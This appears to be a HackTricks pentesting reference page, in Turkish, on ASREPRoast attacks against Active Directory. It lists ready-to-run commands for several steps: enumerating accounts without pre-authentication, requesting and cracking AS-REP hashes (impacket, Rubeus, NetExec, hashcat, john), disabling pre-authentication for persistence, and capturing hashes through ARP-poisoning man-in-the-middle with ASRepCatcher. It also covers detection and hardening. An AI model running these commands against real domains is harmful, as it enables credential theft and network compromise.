# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast, **Kerberos pre-authentication required attribute** özniteliğine sahip olmayan kullanıcıları hedef alan bir güvenlik saldırısıdır. Temel olarak bu güvenlik açığı, saldırganların kullanıcının parolasına ihtiyaç duymadan Domain Controller'dan (DC) bir kullanıcı için kimlik doğrulama isteğinde bulunmasına olanak tanır. DC, kullanıcının parolasından türetilen anahtarla şifrelenmiş bir mesajla yanıt verir. Saldırganlar, kullanıcının parolasını bulmak için bu mesajı offline olarak kırmayı deneyebilir.

Bu saldırı için gereken temel unsurlar şunlardır:

- **Kerberos pre-authentication'ın olmaması**: Hedef kullanıcılar bu güvenlik özelliğini etkinleştirmemiş olmalıdır.
- **Domain Controller'a (DC) bağlantı**: Saldırganların istek gönderip şifrelenmiş mesajları alabilmek için DC'ye erişmesi gerekir.
- **İsteğe bağlı domain hesabı**: Bir domain hesabı, saldırganların LDAP sorguları aracılığıyla savunmasız kullanıcıları daha verimli şekilde belirlemesini sağlar. Böyle bir hesap yoksa saldırganların kullanıcı adlarını tahmin etmesi gerekir.

#### Savunmasız kullanıcıları listeleme (domain kimlik bilgileri gerekir)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### AS_REP mesajı isteği

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus varsayılan olarak **RC4** ister; bu nedenle Event ID **4768** genellikle **preauth type 0** ve **ticket encryption type 0x17** gösterir. **`/aes`** eklerseniz (veya hedef için RC4 devre dışıysa), bunun yerine **AES etypes** bekleyin.<sup>[[2]](#references)</sup>

#### Hızlı tek satırlık komutlar (Linux)

- Önce potansiyel hedefleri (ör. sızdırılmış build yollarından) Kerberos userenum ile listeleyin: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Geçerli kimlik bilgileri olmadan NetExec ile tüm kullanıcı adları listesini roast edin: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Kimlik bilgileriniz varsa, LDAP'ı sorgulayıp roast edilebilir tüm hesapları sizin için istemesi için NetExec kullanın: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Çıktı **`$krb5asrep$23$`** ile başlıyorsa, Hashcat **`-m 18200`** ile crack edin. **`$krb5asrep$17$`** veya **`$krb5asrep$18$`** ile başlıyorsa, John **`--format=krb5asrep`** kullanmayı tercih edin.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Her AS-REP roast'un RC4 olduğunu varsaymayın. Modern araçlar, istenen/uzlaşılan şifreleme türüne bağlı olarak **RC4** (`$krb5asrep$23$`) veya **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) döndürebilir. **`hashcat -m 18200`**, **etype 23** içindir; **John**, `krb5asrep` biçimini **17/18/23** için doğrudan işler.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### Kalıcılık

**GenericAll** izinlerine (veya özellikleri yazma izinlerine) sahip olduğunuz bir kullanıcı için **preauth** gereksinimini kaldırın:

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### Tespit ve sağlamlaştırma

Başarılı bir **ön kimlik doğrulama olmadan AS-REP isteği**, DC'de `Status=0x0` ve `PreAuthType=0` değerlerine sahip bir **4768** olayı üretir; bu, bir isteğin yapıldığını kaydeder, yanıtın kırıldığını veya hesabın ele geçirildiğini kanıtlamaz. Tespitte RC4'ü zorunlu koşul olarak kullanmayın: `TicketEncryptionType=0x17` zayıf şifreleme için yararlı bir göstergedir, ancak saldırgan AES isteyebilir (olay günlüğü değerleri `0x11`/`0x12`). Windows Server 2016 ve sonraki sürümlerde, 14 Ocak 2025 (veya daha yeni) toplu güncellemesi yüklüyse, 4768 olayının 2. sürümü `ClientAdvertizedEncryptionTypes` alanını, hesabın/DC'nin desteklediği etypeları ve kullanılabilir anahtarları da gösterir.<sup>[[5]](#references)</sup>

Uygulanabilir bir av araması, hesapta AES anahtarları bulunmasına rağmen yalnızca RC4 duyuran bir istemciyi işaretler, ardından aynı kaynak IP'den gelen ve birden fazla ön kimlik doğrulaması gerektirmeyen kullanıcıyı hedef alan istek kümelerini ilişkilendirir. Her `PreAuthType=0` olayında alarm üretmek yerine meşru istisnalar için bir temel oluşturun.

Kaynak belirleme için `IpAddress` alanını normalize edin (`::ffff:` eşlemeli IPv4 içerebilir) ve zaman aralığını 4769 hizmet bileti veya 5140 paylaşım erişimi olaylarıyla karşılaştırın. Bu olaylar aynı adresten etkin olan hesapları gösterebilir, ancak ön kimlik doğrulaması gerektirmeyen bir AS-REP isteği için kimliği doğrulanmış hesap gerekmez. Paylaşılan makineler, NAT, proxy'ler ve birden fazla oturum nedeniyle IP eşleşmesi, AS-REQ'yi gönderen kişiyi veya hesabı **belirlemez**. İlişkili hesapları inceleme ipuçları olarak değerlendirin ve uç nokta ya da ağ kanıtlarıyla doğrulayın.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

Kalıcı çözüm, kesinlikle gerekmeyen her kullanıcıda **Kerberos ön kimlik doğrulaması gerektirme** seçeneğini kaldırmak ve açığa çıkan hesap parolalarını değiştirmektir. Bir istisna kaldırılamıyorsa uzun, rastgele oluşturulmuş bir parola kullanın ve ayrıcalıkları en aza indirin. RC4'ü devre dışı bırakmak parola kırma maliyetini artırır, ancak AES AS-REP yanıtları çevrimdışı kırılabilir durumda olduğundan roast edilebilirliği ortadan kaldırmaz.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast kimlik bilgisi olmadan

Aradaki bir saldırgan, normal ve ön kimlik doğrulamalı bir AS değişimi sırasında döndürülen AS-REP'yi yakalayabilir ve şifrelenmiş bölümünü çevrimdışı parola kırmaya uygun biçimde düzenleyebilir. Klasik ASREPRoasting'in aksine, bu yöntem `DONT_REQ_PREAUTH` gerektirmez; ancak yalnızca Kerberos değişimi gerçekten ele geçirilen hesapları elde eder. **ASRepCatcher**, varsayılan olarak tek yönlü ARP zehirlemesiyle aradaki konumu elde eder veya `--disable-spoofing` ile başka bir MitM tekniğinden gelen trafiği kullanabilir.<sup>[[6]](#references)</sup>\
Ön kimlik doğrulaması olmayan bir sorumludan **TGT** yerine **hizmet bileti** döndüren, kimlik bilgisi gerektirmeyen ilgili yöntemi arıyorsanız [Kerberoast](kerberoast.md) sayfasına bakın.

`relay` modunda [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher), yakalanan AS-REQ'leri iletir ve her iki taraf da hâlâ izin veriyorsa **RC4** kullanımını zorlar. `listen` paketleri değiştirmez; dolayısıyla istemci ve DC'nin anlaşma sağladığı şifreleme türünü yakalar. Mümkün olduğunda tüm alt ağa müdahale etmek yerine zehirleme kapsamını `-t`/`-tf` ile belirleyin.<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – 4768 olayı: Kerberos kimlik doğrulama bileti istendi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – Güvenlik olayı 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – Güvenlik olayı 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
